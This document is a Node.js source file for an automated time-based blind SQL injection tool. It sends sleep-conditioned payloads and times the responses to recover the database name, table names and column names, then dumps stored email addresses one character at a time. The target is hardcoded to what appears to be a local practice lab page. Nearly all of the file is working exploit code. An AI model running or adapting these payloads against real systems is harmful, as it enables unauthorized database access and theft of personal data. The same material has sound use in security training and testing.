/** 
 * @author Winters
 * @description  CLI based Blind-Time based sql injection auto exploitation tool
 * @version 1.0.0
*/

/*
' AND (select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null)
) --+
*/

//modules
import fetch from 'node-fetch';
import readline from "readline";
import { performance } from 'perf_hooks';

//The Global class
class EXPLOIT{
    constructor(url){
        this.url = url
        //Array containing all the alphabets
        this.alph_arr = [".","@","_",",","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

    }
    
    //function to get the database length
    async get_db_length(){
        console.log("Enumerating Database length")
        for(let i=0;i<10;i++){
            let payload = "' AND (select if(length(database())="+i+" , sleep(10) ,null )) --+";
            let link = this.url + payload;
            let start_time = performance.now();
            await fetch(link)
            let end_time = performance.now();
            let time_elapsed = end_time - start_time;
            if(time_elapsed > 3000){
                this.database_length = i;
                console.log("\x1b[32m","++[DB LENGTH]++ The length of the database is: "+ this.database_length,"\x1b[0m")
                break;
            }
            else{
                console.log("\x1b[1m\x1b[31m","--[DB LENGTH]-- Dropping char: "+this.alph_arr[i],"\x1b[0m")
            }
        }
    }
    //method to get the database name
    async get_db_name(){
        console.log("Enumerating Database name")
        let db_name = [];
        let final_db_name = "" ;
        for(let j=1;j<=this.database_length;j++){
            for(let i =0;i<this.alph_arr.length;i++){
                let payload = "' AND (select if(substr(database(),"+j+",1)='"+this.alph_arr[i]+"' , sleep(5) ,null )) --+";
                let link = this.url + payload;
                let start_time = performance.now();
                await fetch(link)
                let end_time = performance.now();
                let time_elapsed = end_time - start_time;
                if(time_elapsed > 3000){
                    db_name.push(this.alph_arr[i]);
                    console.log("\x1b[32m","+[DB_NAME]+: Found letter: "+this.alph_arr[i],"\x1b[0m");

                    break;
                }
                else{
                    console.log("\x1b[1m\x1b[31m","--[DB NAME]-- Dropping char: "+this.alph_arr[i],"\x1b[0m")
                }
            }
        }
        for(let i=0;i<db_name.length;i++){
            final_db_name += db_name[i];
        }
        console.log(final_db_name);
        
    }
    //method to get the all tablenames
    async get_table_names(){
        console.log("Enumerating Table name")
        let table_names = [];
        let final_table_names = "" ;
        for(let k =0;k<5;k++){
            for(let j=1;j<20;j++){
                for(let i =0;i<this.alph_arr.length;i++){
                    let payload = "' AND (select if((select substr(table_name,"+j+",1) from information_schema.tables where table_schema=database() limit "+k+",1)='"+this.alph_arr[i]+"',sleep(4),null)) --+";
                    let link = this.url + payload;
                    let start_time = performance.now();
                    await fetch(link)
                    let end_time = performance.now();
                    let time_elapsed = end_time - start_time;
                    if(time_elapsed > 3000){
                        table_names.push(this.alph_arr[i]);
                        console.log("\x1b[32m","+[TABLE_NAME]+: Found letter: "+this.alph_arr[i],"\x1b[0m");
                        break;
                    }
                    else{
                        console.log("\x1b[1m\x1b[31m","--[TABLE NAME]-- Dropping char: "+this.alph_arr[i],"\x1b[0m")
                    }
                }
            }
            table_names.push(",");

        }
        
        
        for(let i=0;i<table_names.length;i++){
            final_table_names += table_names[i];
        }
        console.log("Tables: "+ final_table_names);
        
    }

    // get all the column names
    async get_column_names(){
        console.log("Enumerating Column name")
        let column_names = [];
        let final_column_names = "" ;
        for(let k =0;k<5;k++){
            for(let j=1;j<20;j++){
                for(let i =0;i<this.alph_arr.length;i++){
                    let payload = "' AND (select if((select substr(column_name,"+j+",1) from information_schema.columns where table_name='emails' limit "+k+",1)='"+this.alph_arr[i]+"',sleep(4),null)) --+";
                    let link = this.url + payload;
                    let start_time = performance.now();
                    await fetch(link)
                    let end_time = performance.now();
                    let time_elapsed = end_time - start_time;
                    if(time_elapsed > 3000){
                        column_names.push(this.alph_arr[i]);
                        console.log("\x1b[1m\x1b[32m","+[COLUMN_NAME]+: Found letter: "+this.alph_arr[i],"\x1b[0m");
                        break;
                    }
                    else{
                        console.log("\x1b[1m\x1b[31m","--[COLUMN NAME]-- Dropping char: "+this.alph_arr[i],"\x1b[0m")
                    }
                }
            }
            column_names.push(",");

        }
        for(let i=0;i<column_names.length;i++){
            final_column_names += column_names[i];
        }
        console.log("Columns: "+ final_column_names);
    }

    // dump data
    async get_dump_data(){
        console.log("Dumping Data")
        let dump_data = [];
        let final_dump_data = "" ;
        for(let k =0;k<5;k++){
            for(let j=1;j<20;j++){
                for(let i =0;i<this.alph_arr.length;i++){
                    let payload = "' AND (select if(substr((select email_id from emails limit "+k+",1),"+j+",1)='"+this.alph_arr[i]+"',sleep(5),null)) --+";
                    let link = this.url + payload;
                    let start_time = performance.now();
                    await fetch(link)
                    let end_time = performance.now();
                    let time_elapsed = end_time - start_time;
                    if(time_elapsed > 3000){
                        dump_data.push(this.alph_arr[i]);
                        console.log("\x1b[1m\x1b[32m","+[DUMP_DATA]+: Found letter: "+this.alph_arr[i],"\x1b[0m");
                        break;
                    }
                    else{
                        console.log("\x1b[1m\x1b[31m","--[DUMP DATA]-- Dropping char: "+this.alph_arr[i],"\x1b[0m")
                    }
                }
            }
            dump_data.push(",");

        }
        for(let i=0;i<dump_data.length;i++){
            final_dump_data += dump_data[i];
        }
        console.log("Dumped Data: "+ final_dump_data);
    }

}


//Ask user for input
let read =  readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

read.question('Input your URL: ',async (url) =>{
    //Instantiating the class
    let exp = new EXPLOIT("http://localhost:8000/Less-9/?id=1");
    await exp.get_db_length();
    await exp.get_db_name()
    await exp.get_table_names();
    await exp.get_column_names();
    await exp.get_dump_data();
})




